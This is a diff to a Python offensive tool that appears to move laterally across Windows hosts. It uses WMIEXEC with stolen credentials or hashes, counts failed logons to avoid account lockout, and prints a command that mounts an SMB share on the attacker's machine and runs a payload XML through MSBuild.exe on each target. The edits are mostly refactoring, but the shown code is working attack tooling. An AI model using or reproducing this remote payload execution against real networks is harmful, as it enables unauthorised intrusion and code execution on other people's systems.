@@ -738,13 +738,13 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
-def auto_drive(addresses): # really helpful so you dont have to know which drive letter to use
-    print('{}[+]{} Determining the best drive letter to use this may take a moment...\n'.format(color_BLU, color_reset))
+def auto_drive(addresses, domain): # really helpful so you dont have to know which drive letter to use
+    print('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
     failed_logons = 0
     for ip in addresses:
+        if options.localauth:
+            domain = ip
         try:
-            if options.localauth:
-                domain = ip
             executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
             executer.run(ip, False)
         except Exception as e:
@@ -755,9 +755,9 @@ def auto_drive(addresses): # really helpful so you dont have to know which drive
             with open('log.txt', 'a') as f:
                 f.write('{}: {}\n'.format(ip, str(e)))
                 f.close()
-            logging.error('{}: {}'.format(ip, str(e)))
 
             if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False: # way to track failed logins to see if they're gonna lock the account out
+                logging.error('{}: {}'.format(ip, str(e)))
                 failed_logons += 1
 
             if failed_logons >= 3 and options.localauth == False:
@@ -1001,11 +1001,11 @@ if __name__ == '__main__':
 
         #automatically find the best drive to use
         if options.drive is None and options.method == 'wmiexec':
-            drive_letter = auto_drive(addresses)
+            drive_letter = auto_drive(addresses, domain)
 
         gen_payload(share_name, payload_name, drive_letter) # creates the payload
 
-        print("[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
+        print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
         command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
